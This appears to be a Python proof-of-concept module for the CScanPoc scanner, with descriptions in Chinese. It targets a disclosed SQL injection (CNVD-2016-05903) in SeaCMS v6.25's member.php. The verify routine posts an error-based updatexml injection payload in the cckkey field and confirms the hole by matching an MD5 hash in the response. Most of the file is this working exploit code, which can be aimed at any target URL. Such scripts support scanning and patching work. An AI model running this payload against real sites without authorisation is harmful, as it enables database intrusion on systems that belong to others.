# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'SEACMS_0003_L'  # 平台漏洞编号，留空
    name = '海洋CMS v6.25 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-04-11'  # 漏洞公布时间
    desc = '''
        SeaCMS是一套使用PHP编写的免费、开源的网站内容管理系统。该系统主要被设计用来管理视频点播资源。
        SeaCms是一套用于搭建在线电影的应用，采用PHP+MYSQL架构。
        漏洞出现在member.php中
        key被带入select语句，全局没有过滤。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2016-05903'  # 漏洞来源
    cnvd_id = 'CNVD-2016-05903'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'SEACMS(海洋CMS)'  # 漏洞应用名称
    product_version = '6.25'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '18c33342-2959-4f7c-a3f6-545f72ba8c5c'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 登录用户
            # 获取cookies
            cookies = {}
            '''
            raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
            for line in raw_cookies.split(';'):  
                key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                cookies[key]=value 
            '''
            # 根据安装目录不同payload可能不同，需根据实际情况判断
            payload = '/upload/member.php?action=cz'
            data = "cckkey=aaaa0' or updatexml(1,concat(0x7e,(md5(c))),0) or '"
            url = self.target + payload
            r = requests.post(url, headers=cookies, data=data)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
